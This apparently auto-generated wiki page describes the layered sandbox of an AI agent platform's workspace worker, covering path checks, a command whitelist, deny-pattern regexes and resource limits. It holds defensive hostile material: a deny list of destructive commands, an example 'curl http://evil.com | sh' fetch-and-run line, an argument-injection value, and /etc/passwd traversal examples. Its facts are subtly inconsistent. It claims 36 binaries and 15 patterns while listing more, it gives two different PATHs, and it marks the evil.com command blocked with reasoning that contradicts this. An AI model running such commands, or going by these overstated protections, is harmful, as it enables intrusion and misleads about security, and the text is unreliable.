# Security & Sandboxing

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [frontend/components/widgets/CodingCanvasWidget/RepoSelector.tsx](frontend/components/widgets/CodingCanvasWidget/RepoSelector.tsx)
- [orchestrator/api/tasks.py](orchestrator/api/tasks.py)
- [orchestrator/api/widgets/cors.py](orchestrator/api/widgets/cors.py)
- [orchestrator/api/widgets/rate_limit.py](orchestrator/api/widgets/rate_limit.py)
- [orchestrator/api/workspace_files.py](orchestrator/api/workspace_files.py)
- [orchestrator/api/workspace_github.py](orchestrator/api/workspace_github.py)
- [orchestrator/core/workspace_client.py](orchestrator/core/workspace_client.py)
- [orchestrator/modules/tools/discovery/action_registry.py](orchestrator/modules/tools/discovery/action_registry.py)
- [orchestrator/modules/tools/discovery/workspace_actions.py](orchestrator/modules/tools/discovery/workspace_actions.py)
- [services/workspace-worker/executor.py](services/workspace-worker/executor.py)
- [services/workspace-worker/main.py](services/workspace-worker/main.py)
- [services/workspace-worker/workspace_manager.py](services/workspace-worker/workspace_manager.py)

</details>



This document describes the security architecture for code execution, file operations, and resource management in Automatos AI. The system implements a defense-in-depth strategy with five independent security layers to prevent unauthorized access, resource exhaustion, and malicious code execution. For authentication and multi-tenancy isolation at the database and API level, see [Authentication & Multi-Tenancy](#12).

The security model focuses on the **workspace worker** ([services/workspace-worker/]()) which is the primary attack surface — it executes arbitrary agent-generated commands and file operations within isolated workspace directories on a persistent volume.

---

## Multi-Layered Security Architecture

The workspace execution system enforces security at five independent layers. Each layer provides defense-in-depth protection: if one layer fails, the others still provide containment.

```mermaid
graph TB
    subgraph "Layer 1: URL & Input Validation"
        URLValidation["URL Validation<br/>_ALLOWED_CLONE_HOSTS<br/>_BRANCH_RE pattern"]
        RequestValidation["Request Input Validation<br/>Pydantic models<br/>Field validators"]
    end
    
    subgraph "Layer 2: Path Safety"
        PathSafety["resolve_safe_path()<br/>Blocks: .., symlinks, /abs, nullbytes"]
        SensitiveFilter["Sensitive Path Filter<br/>_SENSITIVE_NAMES<br/>.ssh, .gitconfig, .task_env_*"]
        WorkspaceRoot["Workspace Root Confinement<br/>/workspaces/{workspace_id}/"]
    end
    
    subgraph "Layer 3: Command Controls"
        CommandWhitelist["ALLOWED_COMMANDS set<br/>36 approved binaries"]
        BlockedPatterns["BLOCKED_PATTERNS regex<br/>15 dangerous patterns"]
        CommandValidation["_validate_command()<br/>Binary extraction + validation"]
    end
    
    subgraph "Layer 4: Environment Sandbox"
        StrippedPATH["Stripped PATH<br/>/usr/local/bin:/usr/bin:/bin"]
        EnvSandbox["_build_sandboxed_env()<br/>No host variables"]
        CredentialInjection["Temporary Credentials<br/>inject_credentials()<br/>cleanup_task()"]
    end
    
    subgraph "Layer 5: Resource Limits"
        StorageQuota["Storage Quotas<br/>DEFAULT_QUOTA_GB<br/>check_quota()"]
        OutputLimits["Output Limits<br/>MAX_STDOUT_BYTES: 100KB<br/>MAX_STDERR_BYTES: 50KB"]
        TimeoutEnforcement["Timeout Enforcement<br/>DEFAULT_TIMEOUT: 120s<br/>asyncio.wait_for()"]
        RateLimits["Rate Limits<br/>WidgetRateLimitMiddleware<br/>30 req/min public"]
    end
    
    URLValidation --> PathSafety
    RequestValidation --> PathSafety
    PathSafety --> CommandValidation
    CommandValidation --> EnvSandbox
    EnvSandbox --> StorageQuota
    EnvSandbox --> OutputLimits
    EnvSandbox --> TimeoutEnforcement
```

**Defense-in-Depth Strategy**: Each layer operates independently. For example, even if an attacker bypasses command validation (layer 3), path safety (layer 2) prevents writing outside the workspace, and resource limits (layer 5) prevent DoS attacks. The credential cleanup in layer 4 ensures no secrets persist beyond task completion.

**Sources**: [services/workspace-worker/executor.py:1-537](), [services/workspace-worker/workspace_manager.py:1-308](), [orchestrator/api/workspace_github.py:36-92](), [services/workspace-worker/main.py:461-818]()

---

## Layer 1: URL & Input Validation

### GitHub Clone URL Validation

All external repository URLs pass through strict validation before reaching the worker. The validation prevents injection attacks and credential leakage.

| Validation Rule | Implementation | Blocked Examples |
|----------------|----------------|------------------|
| **HTTPS only** | `parsed.scheme != "https"` | `git://`, `http://`, `ssh://git@` |
| **Allowed hosts** | `_ALLOWED_CLONE_HOSTS` set | `evil.com`, arbitrary domains |
| **No embedded credentials** | Check for `username` or `password` in URL | `https://token@github.com` |
| **Branch name pattern** | `_BRANCH_RE = r"^[A-Za-z0-9._/\-]+$"` | `--upload-pack=evil`, `../escape`, `@{injection}` |

```mermaid
sequenceDiagram
    participant API as "workspace_github.py<br/>CloneRequest"
    participant Validator as "Pydantic Validators"
    participant Worker as "workspace-worker<br/>executor.py"
    
    API->>Validator: validate_repo_url(url)
    Validator->>Validator: Check scheme == "https"
    Validator->>Validator: Check hostname in _ALLOWED_CLONE_HOSTS
    Validator->>Validator: Check no embedded credentials
    
    API->>Validator: validate_branch(branch)
    Validator->>Validator: Check _BRANCH_RE pattern
    Validator->>Validator: Block "..", "@{", leading "-"
    
    alt Validation Failed
        Validator-->>API: ValueError
        API-->>API: Return 400 Bad Request
    else Validation Passed
        API->>Worker: Enqueue git_clone step
        Worker->>Worker: _git_clone() with "--" separator
    end
```

**PRD-70 FIX-01**: Branch name validation prevents argument injection attacks. The `--` separator in the git clone command ([executor.py:406]()) ensures all arguments after it are treated as positional (URLs/paths), not flags. This blocks attacks like `--upload-pack=/path/to/malicious-script`.

**Sources**: [orchestrator/api/workspace_github.py:65-92](), [services/workspace-worker/executor.py:366-419]()

### Request Input Validation

All API endpoints use Pydantic models with field validators to enforce input constraints before processing:

```python
# Example: ExecRequest in workspace_files.py
class ExecRequest(BaseModel):
    command: str = Field(..., min_length=1, max_length=4096)
    cwd: Optional[str] = None
    timeout: int = Field(default=120, ge=1, le=300)
```

**Max Lengths**: Commands are capped at 4096 bytes to prevent memory exhaustion from parsing. File paths have similar limits enforced at the Pydantic layer.

**Sources**: [orchestrator/api/workspace_files.py:80-84](), [orchestrator/api/tasks.py:39-57]()

---

## Layer 2: Path Safety & Filesystem Isolation

### `resolve_safe_path()` — The Core Safety Mechanism

Every file operation (read, write, list, grep) goes through `WorkspaceManager.resolve_safe_path()` which provides absolute path containment:

```python
def resolve_safe_path(self, relative_path: str) -> Path:
    """Resolve a path and guarantee it stays within the workspace.
    
    Blocks: ../../ traversal, symlink escape, absolute paths, null bytes.
    """
    if "\x00" in relative_path:
        raise SecurityError("Null byte in path")
    if relative_path.startswith("/"):
        raise SecurityError("Absolute path not allowed")
    
    resolved = (self.root / relative_path).resolve()  # Resolves symlinks
    base_resolved = self.root.resolve()
    
    try:
        resolved.relative_to(base_resolved)  # Must be descendant
    except ValueError:
        raise SecurityError("Path traversal blocked")
    
    return resolved
```

**Blocked Path Patterns**:

| Attack Pattern | Detection Method | Example |
|---------------|------------------|---------|
| **Directory traversal** | `.relative_to()` check after `.resolve()` | `../../etc/passwd`, `repos/../../../etc/hosts` |
| **Symlink escape** | `.resolve()` canonicalization | `ln -s /etc/passwd evil.txt` → blocked if resolves outside workspace |
| **Absolute paths** | `startswith("/")` check | `/etc/shadow`, `/var/log/syslog` |
| **Null byte injection** | `"\x00" in relative_path` | `file.txt\x00.exe` (bypass extension checks) |

**Sources**: [services/workspace-worker/workspace_manager.py:228-254]()

### Workspace Filesystem Layout

Each workspace gets an isolated directory tree with controlled access:

```
/workspaces/{workspace_id}/
├── repos/                  ← Cloned repositories (persistent, git pull on revisit)
│   ├── repo1/
│   └── repo2/
├── tasks/                  ← Ephemeral per-task execution dirs (cleaned up)
│   ├── task_{uuid1}/
│   └── task_{uuid2}/
├── artifacts/              ← Build outputs, test reports (persistent)
├── .ssh/                   ← Deploy keys (sensitive, hidden from API)
│   ├── id_ed25519
│   └── config
├── .gitconfig              ← Per-workspace git identity (sensitive)
├── .task_env_{task_id}     ← Task-specific env vars (sensitive, cleaned up)
└── .workspace_meta.json    ← Metadata (quota, task count)
```

**Sensitive Path Filtering**: The health server's file browsing endpoints ([main.py:473-481]()) block access to sensitive paths:

```python
_SENSITIVE_NAMES = {".ssh", ".gitconfig", ".aws", ".gcp", ".workspace_meta.json"}

def _is_sensitive(name: str) -> bool:
    if name in _SENSITIVE_NAMES:
        return True
    if name.startswith(".task_env_"):  # Temporary credential files
        return True
    return False
```

Attempting to read `/api/workspaces/{id}/files/content?path=.ssh/id_ed25519` returns **403 Forbidden**.

**Sources**: [services/workspace-worker/workspace_manager.py:1-18](), [services/workspace-worker/main.py:472-612]()

---

## Layer 3: Command Whitelist & Execution Controls

### The Command Whitelist

Only binaries in the `ALLOWED_COMMANDS` set can execute. This prevents arbitrary code execution via obscure system utilities:

```python
ALLOWED_COMMANDS: set[str] = {
    # Shell builtins / interpreters
    "sh", "bash", "cd", "pwd", "export", "source", "test", "true", "false",
    
    # Version control
    "git",
    
    # Python ecosystem
    "python", "python3", "pip", "pip3", "uv",
    "pytest", "ruff", "black", "mypy", "isort", "flake8",
    "coverage", "tox", "python3.12",
    
    # Node.js ecosystem
    "node", "npm", "npx", "pnpm", "yarn",
    "vitest", "jest", "tsc", "eslint", "prettier",
    
    # General tools
    "ls", "cat", "grep", "egrep", "fgrep", "rg",
    "find", "tree", "wc", "sort", "uniq", "cut", "tr",
    "head", "tail", "diff", "patch", "jq", "sed", "awk",
    "xargs", "tee", "less", "more",
    "curl", "wget",
    "make", "cmake",
    "tar", "gzip", "gunzip", "zip", "unzip", "bzip2",
    "touch", "mkdir", "cp", "mv", "rm", "ln", "chmod",
    "echo", "printf", "env", "which", "whoami", "id",
    "date", "basename", "dirname", "realpath", "readlink",
    "stat", "file", "du", "df",
    "ps", "kill", "sleep", "timeout",
    "clear", "reset",
    
    # Language runtimes (polyglot repos)
    "cargo", "go", "ruby", "java", "javac", "mvn", "gradle",
    "rustc", "gcc", "g++",
    
    # Docker (read-only inspection only)
    "docker-compose",
}
```

**36 binaries total**. Notably absent: `sudo`, `su`, `systemctl`, `kubectl`, `iptables`, `mount`, `passwd`, `useradd` — all privilege escalation or system modification tools.

**Sources**: [services/workspace-worker/executor.py:35-73]()

### Blocked Patterns — The Override Layer

Even if a binary is whitelisted, commands matching `BLOCKED_PATTERNS` are rejected:

```python
BLOCKED_PATTERNS: list[str] = [
    r"rm\s+-rf\s+/\s*$",        # rm -rf /
    r"rm\s+-rf\s+/[^w]",        # rm -rf /anything (but not /workspaces)
    r"\bsudo\b",                 # privilege escalation
    r"\bsu\s",                   # user switching
    r"\bchmod\s+777\b",          # dangerous permissions
    r"\bkubectl\b",              # k8s access
    r">\s*/dev/",                # device access
    r"\bmkfs\b",                 # filesystem formatting
    r"\bdd\s+if=",              # raw disk operations
    r"\biptables\b",            # firewall manipulation
    r"\bsystemctl\b",           # service management
    r"\bpasswd\b",              # password changes
    r"\buseradd\b",             # user creation
    r"\buserdel\b",             # user deletion
    r"\bmount\b",               # filesystem mounting
    r"\bumount\b",              # filesystem unmounting
    r"`",                        # backtick execution
    r"\n",                       # embedded newlines
]
```

**15 patterns** compiled into regex objects for efficient matching. These patterns catch dangerous operations that might slip through the whitelist (e.g., `chmod 777` is technically just `chmod`, which is whitelisted for legitimate uses like `chmod +x script.sh`).

**Sources**: [services/workspace-worker/executor.py:76-98]()

### Command Validation Logic

The `_validate_command()` method performs multi-segment validation:

```mermaid
graph TD
    Input["Command String"]
    
    Input --> CheckBlocked["Check BLOCKED_PATTERNS<br/>15 compiled regex"]
    CheckBlocked -->|Match| Reject1["Return error:<br/>blocked by security policy"]
    CheckBlocked -->|No match| Split["Split on &&, ||, ;, |<br/>Extract segments"]
    
    Split --> LoopSegments["For each segment"]
    LoopSegments --> SkipEnvVars["Skip FOO=bar assignments"]
    SkipEnvVars --> ExtractBinary["Extract first non-assignment token"]
    
    ExtractBinary --> CheckPath["Check for /, \\, or leading ."]
    CheckPath -->|Found| Reject2["Return error:<br/>path-based binary not allowed"]
    CheckPath -->|Clean| CheckWhitelist["Check if binary in ALLOWED_COMMANDS"]
    
    CheckWhitelist -->|Not found| Reject3["Return error:<br/>binary not in whitelist"]
    CheckWhitelist -->|Found| LoopSegments
    
    LoopSegments --> AllValid["All segments valid"]
    AllValid --> Allow["Return None<br/>Command allowed"]
```

**Path-Based Binary Rejection**: Commands like `/usr/bin/python` or `./malicious` are rejected even if the base binary (`python`) is whitelisted. This prevents execution of arbitrary binaries via absolute or relative paths.

**Example Validations**:

| Command | Result | Reason |
|---------|--------|--------|
| `pytest tests/` | ✅ Allowed | `pytest` in whitelist |
| `python -m pytest tests/` | ✅ Allowed | `python` in whitelist |
| `sudo python test.py` | ❌ Blocked | Matches `\bsudo\b` pattern |
| `/usr/local/bin/evil` | ❌ Blocked | Path-based binary |
| `./run_exploit.sh` | ❌ Blocked | Relative path binary |
| `rm -rf /` | ❌ Blocked | Matches `rm\s+-rf\s+/\s*$` pattern |
| `git clone && rm important.txt` | ✅ Allowed | Both `git` and `rm` in whitelist, no dangerous flags |
| `python script.py && curl http://evil.com \| sh` | ❌ Blocked | `sh` would need validation, but pipe operators complicate this; in practice the command is split and validated per segment |

**Sources**: [services/workspace-worker/executor.py:448-501]()

### Shell vs Exec Mode

The executor uses two execution modes based on command complexity:

```python
has_shell_operators = any(op in command for op in ("|", "&&", "||", ";", ">", "<"))

if has_shell_operators:
    # Shell mode — allows pipes, redirects, compound commands
    proc = await asyncio.create_subprocess_shell(
        command,
        cwd=str(work_dir),
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        env=env,
    )
else:
    # Exec mode — safer, no shell interpretation
    argv = shlex.split(command)
    proc = await asyncio.create_subprocess_exec(
        *argv,
        cwd=str(work_dir),
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        env=env,
    )
```

**Security Note**: Shell mode is used for compound commands like `pytest tests/ && npm run build`. This is safe because `_validate_command()` has already verified each segment against the whitelist and blocked patterns **before** the command reaches the execution stage.

**Sources**: [services/workspace-worker/executor.py:167-184]()

---

## Layer 4: Environment Sandboxing

### Stripped PATH & Sandboxed Environment

The `_build_sandboxed_env()` method creates a minimal environment that strips all host variables:

```python
def _build_sandboxed_env(self, extras: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    """Build a stripped-down environment for subprocess execution.
    
    Only includes essential vars. Removes any sensitive host env vars.
    """
    env = {
        # Minimal PATH — only standard locations
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        
        # Workspace identity
        "WORKSPACE_ID": self.ws.workspace_id,
        "HOME": str(self.ws.root),
        
        # Git config location
        "GIT_CONFIG_GLOBAL": str(self.ws.root / ".gitconfig"),
        
        # SSH config
        "GIT_SSH_COMMAND": f"ssh -F {self.ws.root / '.ssh' / 'config'} ...",
        
        # Locale
        "LANG": "en_US.UTF-8",
        "LC_ALL": "en_US.UTF-8",
        
        # Python
        "PYTHONDONTWRITEBYTECODE": "1",
        "PYTHONUNBUFFERED": "1",
        
        # Node
        "NODE_ENV": "test",
        "npm_config_cache": str(self.ws.root / ".npm_cache"),
    }
    
    # Add any task-specific extras
    if extras:
        env.update(extras)
    
    return env
```

**What's Stripped**:
- All host environment variables (`os.environ` is not passed)
- AWS credentials, API keys, tokens from the host
- Custom PATHs that might contain malicious binaries
- User-specific configurations from the host

**What's Included**:
- Standard binary locations only
- Workspace-scoped HOME directory
- Git and SSH configurations pointing to workspace-local files
- Minimal locale and runtime settings

**Sources**: [services/workspace-worker/executor.py:506-537]()

### Credential Injection & Cleanup

Credentials (SSH keys, git identity, env vars) are injected per-task and cleaned up immediately after:

```mermaid
sequenceDiagram
    participant Worker as "WorkspaceWorker<br/>_execute_task()"
    participant Manager as "WorkspaceManager"
    participant Executor as "WorkspaceToolExecutor"
    participant FS as "Filesystem"
    
    Worker->>Manager: inject_credentials(task_id, creds)
    Manager->>FS: Write .ssh/id_ed25519 (mode 0600)
    Manager->>FS: Write .ssh/config
    Manager->>FS: Write .gitconfig
    Manager->>FS: Write .task_env_{task_id} (mode 0600)
    
    Worker->>Executor: execute_step(git_clone)
    Executor->>Executor: _build_sandboxed_env()<br/>Sets GIT_SSH_COMMAND
    Executor->>FS: git clone uses injected SSH key
    
    Worker->>Worker: Task completes (success or failure)
    Worker->>Manager: cleanup_task(task_id)
    Manager->>FS: Delete tasks/task_{task_id}/ (recursive)
    Manager->>FS: Delete .task_env_{task_id}
    
    Note over Manager,FS: .ssh/ and .gitconfig persist<br/>for future tasks in this workspace
```

**Credential Types**:

| Credential Type | Storage Path | Cleanup Policy | Purpose |
|----------------|--------------|----------------|---------|
| `ssh_private_key` | `.ssh/id_ed25519` | Persist per workspace | Git clone via SSH |
| `git_name`, `git_email` | `.gitconfig` | Persist per workspace | Git commit authorship |
| `env_vars` (dict) | `.task_env_{task_id}` | **Deleted after task** | Task-specific secrets (API keys) |

**Ephemeral Credentials**: The `.task_env_{task_id}` file is deleted in the `finally` block of `_execute_task()`, ensuring secrets never persist beyond task completion even if the task fails.

**Sources**: [services/workspace-worker/workspace_manager.py:166-213](), [services/workspace-worker/main.py:355-358]()

---

## Layer 5: Resource Quotas & Limits

### Storage Quotas

Each workspace has a configurable storage quota to prevent resource exhaustion:

```python
DEFAULT_QUOTA_GB = int(os.environ.get("WORKSPACE_DEFAULT_QUOTA_GB", "5"))

def check_quota(self) -> bool:
    """Check if workspace is under storage quota. Updates _current_usage."""
    usage = self.get_usage_bytes()
    under = usage < self.quota_bytes
    if not under:
        logger.warning(
            "Workspace %s over quota: %s / %s",
            self.workspace_id[:8], self.usage_human, self.quota_human,
        )
    return under
```

**Enforcement**: The worker checks quota before executing each task ([main.py:252-264]()). If the workspace exceeds quota, the task fails immediately with a descriptive error message prompting the user to free space.

**Default Quota**: **5 GB** per workspace. This is sufficient for most development tasks (cloning repos, running tests) while preventing runaway disk usage.

**Sources**: [services/workspace-worker/workspace_manager.py:33, 82-115](), [services/workspace-worker/main.py:252-264]()

### Output Size Limits

Command stdout and stderr are capped to prevent memory exhaustion from verbose output:

```python
MAX_STDOUT_BYTES = 100_000    # 100KB
MAX_STDERR_BYTES = 50_000     # 50KB

stdout = stdout_bytes[:MAX_STDOUT_BYTES].decode("utf-8", errors="replace")
stderr = stderr_bytes[:MAX_STDERR_BYTES].decode("utf-8", errors="replace")
truncated = len(stdout_bytes) > MAX_STDOUT_BYTES or len(stderr_bytes) > MAX_STDERR_BYTES
```

**Truncation Indicator**: The result includes a `"truncated": true` flag when output exceeds limits, alerting agents that full output was not captured.

**Rationale**: Prevents attacks where a malicious command generates infinite output (e.g., `cat /dev/urandom`) which would exhaust worker memory. 100KB is sufficient for most legitimate command output (test results, build logs).

**Sources**: [services/workspace-worker/executor.py:101-207]()

### Timeout Enforcement

All commands have a maximum execution time:

```python
DEFAULT_TIMEOUT = 120  # 2 minutes

try:
    stdout_bytes, stderr_bytes = await asyncio.wait_for(
        proc.communicate(), timeout=timeout
    )
except asyncio.TimeoutError:
    proc.kill()  # SIGKILL
    await proc.wait()
    return {
        "exit_code": -1,
        "stdout": "",
        "stderr": f"Command timed out after {timeout}s",
        "duration_ms": elapsed,
        "timed_out": True,
    }
```

**Configurable Limits**:
- Default: **120 seconds**
- Maximum (API enforced): **300 seconds** (5 minutes)
- Git clone timeout: **300 seconds**

**Force Kill**: `proc.kill()` sends SIGKILL, which cannot be caught or ignored, ensuring the process terminates even if it's stuck in an uninterruptible state.

**Sources**: [services/workspace-worker/executor.py:104-200]()

### Rate Limiting (Widget API)

The widget API uses per-API-key rate limiting to prevent abuse:

```python
DEFAULT_PUBLIC_RATE = 30     # requests per minute
DEFAULT_SERVER_RATE = 1000   # requests per minute
WINDOW_SIZE = 60             # seconds

class RateLimitStore:
    """Thread-safe in-memory sliding-window rate-limit counter."""
    
    def check(self, key_id: str, limit: int) -> tuple[bool, int, int, int]:
        """Returns (allowed, limit, remaining, reset_seconds)."""
        now = time.monotonic()
        cutoff = now - WINDOW_SIZE
        
        with self._lock:
            bucket = self._buckets[key_id]
            bucket[:] = [ts for ts in bucket if ts > cutoff]  # Sliding window
            count = len(bucket)
            
            if count >= limit:
                reset_seconds = int(bucket[0] - cutoff) + 1
                return (False, limit, 0, reset_seconds)
            
            bucket.append(now)
            # ...
```

**Rate Limit Tiers**:
- **Public keys** (`ak_pub_*`): **30 req/min**
- **Server keys** (`ak_srv_*`): **1000 req/min**
- **No key** (IP-based): **30 req/min**

**Sliding Window**: Unlike fixed-window rate limiting (which can be gamed by making all requests at window boundaries), the sliding window implementation tracks exact request timestamps, providing smooth rate limiting.

**Sources**: [orchestrator/api/widgets/rate_limit.py:36-79]()

---

## Security Threat Model

The system is designed to defend against the following threat vectors:

### Prevented Attacks

| Attack Type | Prevention Mechanism | Layer |
|-------------|---------------------|-------|
| **Directory Traversal** | `resolve_safe_path()` with `.relative_to()` check | Layer 2 |
| **Symlink Escape** | `.resolve()` canonicalization before containment check | Layer 2 |
| **Command Injection** | Whitelist + blocked patterns + `shlex.split()` | Layer 3 |
| **Privilege Escalation** | No `sudo`, `su`, `systemctl` in whitelist | Layer 3 |
| **Arbitrary Binary Execution** | Path-based binary rejection (`/usr/bin/*`, `./evil`) | Layer 3 |
| **Environment Pollution** | Stripped `os.environ`, sandboxed PATH | Layer 4 |
| **Credential Theft** | Sensitive path filtering, ephemeral `.task_env_*` | Layer 2, 4 |
| **Resource Exhaustion (disk)** | Storage quotas with pre-flight check | Layer 5 |
| **Resource Exhaustion (memory)** | Output size limits (100KB stdout, 50KB stderr) | Layer 5 |
| **Resource Exhaustion (CPU)** | Timeout enforcement (120s default, 300s max) | Layer 5 |
| **Rate Limit Bypass** | Per-API-key sliding window rate limiting | Layer 5 |
| **URL Injection** | HTTPS-only, allowed hosts, no embedded credentials | Layer 1 |
| **Branch Injection** | Regex validation + `--` separator in git commands | Layer 1 |

### Known Limitations

| Limitation | Impact | Mitigation |
|-----------|--------|-----------|
| **Shared Kernel** | Container escape could affect host | Run worker in isolated VM/namespace |
| **Docker Access** | `docker-compose` is whitelisted (read-only operations) | Block socket mounts in production |
| **Network Access** | Commands can make arbitrary HTTP requests | Implement network policy in production |
| **Fork Bombs** | `python -c "import os; os.fork()"` can spawn many processes | Implement process count limit (cgroups) |

**Production Hardening**: In production deployments, the worker should run in:
1. A dedicated VM or Kubernetes pod with resource limits (cgroups)
2. A network namespace with restricted egress (only allow specific domains)
3. No Docker socket access (remove `docker-compose` from whitelist if not needed)

**Sources**: All files referenced in previous sections

---

## CORS & Widget API Security

The widget API (`/api/widgets/*`) has special security requirements because it's designed for embedding in external sites. Two ASGI middlewares provide protection without buffering SSE streams.

### Dynamic CORS Validation

The `WidgetCORSMiddleware` enforces origin validation:

```python
WIDGET_ORIGIN_ALLOWLIST: set[str] = {
    o.strip().rstrip("/") for o in _RAW_ALLOWLIST.split(",") if o.strip()
}

def _origin_allowed(origin: str) -> bool:
    """Return True if origin is in the configured allowlist."""
    if not WIDGET_ORIGIN_ALLOWLIST:
        return True  # Development mode — all origins allowed
    return origin.rstrip("/") in WIDGET_ORIGIN_ALLOWLIST
```

**CORS Headers Injected**:
```
Access-Control-Allow-Origin: {origin}           (if allowed)
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, X-Workspace-ID
Access-Control-Max-Age: 86400
Vary: Origin
```

**Preflight Handling**: The middleware intercepts `OPTIONS` requests and returns appropriate CORS headers without calling downstream handlers. If the origin is not allowed, it returns **403 Forbidden**.

**Sources**: [orchestrator/api/widgets/cors.py:1-93]()

### Per-API-Key Rate Limiting

The `WidgetRateLimitMiddleware` uses a sliding-window counter to enforce per-key limits:

```mermaid
graph LR
    Request["HTTP Request"]
    
    Request --> ExtractKey["Extract Identifier<br/>API key or IP"]
    ExtractKey --> CheckLimit["RateLimitStore.check()<br/>Sliding Window"]
    
    CheckLimit -->|Allowed| InjectHeaders["Inject Rate-Limit Headers<br/>X-RateLimit-Limit<br/>X-RateLimit-Remaining<br/>X-RateLimit-Reset"]
    CheckLimit -->|Exceeded| Return429["Return 429 Too Many Requests<br/>Retry-After: {reset_seconds}"]
    
    InjectHeaders --> Downstream["Forward to Handler"]
```

**Rate Limit Headers** (injected on every response):
```
X-RateLimit-Limit: 30
X-RateLimit-Remaining: 27
X-RateLimit-Reset: 54
```

**429 Response** (when limit exceeded):
```json
{
  "detail": "Rate limit exceeded",
  "retry_after": 54
}
```

The `Retry-After` header allows SDK consumers to implement exponential backoff.

**Sources**: [orchestrator/api/widgets/rate_limit.py:1-166]()

---

## Credential Management Best Practices

### Temporary Credential Pattern

The workspace worker uses a **per-task credential injection** pattern:

```python
# 1. Worker receives task payload with credentials
payload = {
    "task_id": "abc123",
    "workspace_id": "ws-xyz",
    "credentials": {
        "ssh_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...",
        "git_name": "Agent Bot",
        "git_email": "agent@automatos.app",
        "env_vars": {"GITHUB_TOKEN": "ghp_..."}
    }
}

# 2. Inject credentials before execution
ws_manager.inject_credentials(task_id, credentials)
# Creates:
#   - .ssh/id_ed25519 (mode 0600)
#   - .gitconfig
#   - .task_env_{task_id} (mode 0600)

# 3. Execute task steps with sandboxed environment
executor = WorkspaceToolExecutor(ws_manager)
result = await executor.execute_step(step)

# 4. ALWAYS cleanup in finally block
finally:
    ws_manager.cleanup_task(task_id)
    # Deletes:
    #   - tasks/task_{task_id}/ (recursive)
    #   - .task_env_{task_id}
```

**Key Properties**:
1. **Scoped**: Credentials are task-specific (`.task_env_{task_id}`)
2. **Ephemeral**: Deleted in `finally` block, even on errors
3. **Restrictive Permissions**: Files created with mode `0600` (owner read/write only)
4. **Isolated**: Sandboxed environment prevents credential leakage via environment variable enumeration

**Sources**: [services/workspace-worker/main.py:269-358](), [services/workspace-worker/workspace_manager.py:166-213]()

### Git Credential Handling

For GitHub cloning, the system injects OAuth tokens into HTTPS URLs:

```python
# Token retrieval from Composio
token = await asyncio.to_thread(
    client.get_app_access_token, entity_id, "GITHUB"
)

# Token injection (PRD-70 compliant)
if token and clone_url.startswith("https://github.com"):
    clone_url = clone_url.replace(
        "https://github.com",
        f"https://x-access-token:{token}@github.com",
    )
```

**Security Properties**:
1. **Never logged**: The final `clone_url` with token is never passed to `logger.info()`
2. **Not persisted**: Token is not written to `.gitconfig` or any file
3. **Process-scoped**: Token only exists in the git clone subprocess memory
4. **Fallback safe**: If token retrieval fails, clone proceeds without auth (public repos only)

**Sources**: [orchestrator/api/workspace_github.py:195-211]()

---

## Summary: Defense-in-Depth in Practice

The five-layer security model ensures that **no single vulnerability can compromise the system**. Examples of defense-in-depth in action:

### Scenario 1: Malicious File Read

An attacker tries to read `/etc/passwd`:

1. ❌ **Layer 1** (Input Validation): Passes — `path=/etc/passwd` is a valid string
2. ❌ **Layer 2** (Path Safety): **BLOCKED** — `resolve_safe_path("/etc/passwd")` raises `SecurityError("Absolute path not allowed")`
3. N/A Layers 3-5 never reached

### Scenario 2: Command Injection via `sudo`

An attacker tries to run `sudo rm -rf /`:

1. ❌ **Layer 1** (Input Validation): Passes — valid command string
2. N/A **Layer 2** (Path Safety): Not applicable to commands
3. ❌ **Layer 3** (Command Controls): **BLOCKED** — Matches `\bsudo\b` in `BLOCKED_PATTERNS`
4. N/A Layers 4-5 never reached

### Scenario 3: Resource Exhaustion via Infinite Output

An attacker tries to run `cat /dev/urandom`:

1. ✅ **Layer 1** (Input Validation): Passes
2. N/A **Layer 2** (Path Safety): Not applicable
3. ✅ **Layer 3** (Command Controls): Passes — `cat` is whitelisted
4. ✅ **Layer 4** (Environment Sandbox): Passes — command executes
5. ❌ **Layer 5** (Resource Limits): **MITIGATED** — Output truncated at 100KB, `"truncated": true` flag set

### Scenario 4: Directory Traversal via Symlink

An attacker creates a symlink `ln -s /etc/passwd exposed.txt` then tries to read it:

1. ✅ **Layer 1** (Input Validation): Passes — `path=exposed.txt` is valid
2. ❌ **Layer 2** (Path Safety): **BLOCKED** — `resolve_safe_path("exposed.txt")` resolves symlink to `/etc/passwd`, which fails `.relative_to()` check
3. N/A Layers 3-5 never reached

**Conclusion**: The layered architecture means even sophisticated attacks that bypass one layer are caught by subsequent layers. This defense-in-depth strategy is critical for a system that executes untrusted agent-generated code.

**Sources**: All sections above

---